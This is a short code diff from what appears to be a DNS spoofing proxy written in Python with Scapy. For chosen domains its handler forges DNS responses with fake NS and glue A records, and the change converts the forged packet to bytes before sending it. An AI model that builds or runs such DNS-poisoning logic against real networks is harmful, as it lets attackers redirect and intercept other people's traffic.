@@ -55,7 +55,7 @@ def handler(data, addr, socket, dns_ip):
                     ns=DNSRR(rrname=original_dns_packet[DNS].qd.qname, type='NS', ttl=84107, rdata=to_be_spoofed[url]['ns']),
                     ar=DNSRR(rrname=to_be_spoofed[url]['ns'], type='A', ttl=1360, rdata='1.1.1.1'))
                 print "Spoofed packet", spoofed_dns_packet.show()
-                proxy_response = spoofed_dns_packet
+                proxy_response = bytes(spoofed_dns_packet)
             else:
                 print "Request for %s will NOT be spoofed" % url[:-1]
                 proxy_response = server_response[2:]
